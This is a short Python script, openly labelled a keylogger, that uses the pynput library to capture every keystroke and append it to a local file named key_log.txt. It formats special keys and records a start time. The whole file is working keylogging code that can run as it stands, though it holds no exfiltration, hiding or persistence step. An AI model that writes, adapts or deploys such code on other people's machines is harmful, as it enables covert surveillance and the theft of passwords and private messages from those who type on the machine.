from pynput.keyboard import Listener
import datetime

# Define the log file
log_file = "key_log.txt"


def write_to_file(key):
    # Convert key to a readable format and append it to the log file
    with open(log_file, "a") as f:
        key_data = str(key).replace("'", "")

        # Format special keys
        if key_data == "Key.space":
            f.write(" ")
        elif key_data == "Key.enter":
            f.write("\n")
        elif key_data == "Key.backspace":
            f.write(" [BACKSPACE] ")
        elif key_data == "Key.tab":
            f.write(" [TAB] ")
        else:
            f.write(key_data)


def on_press(key):
    write_to_file(key)


def start_keylogger():
    # Log the start time
    with open(log_file, "a") as f:
        f.write(f"\n=== Keylogger Started at {datetime.datetime.now()} ===\n")

    # Start listening to keystrokes
    with Listener(on_press=on_press) as listener:
        listener.join()


# Run the keylogger
if __name__ == "__main__":
    start_keylogger()

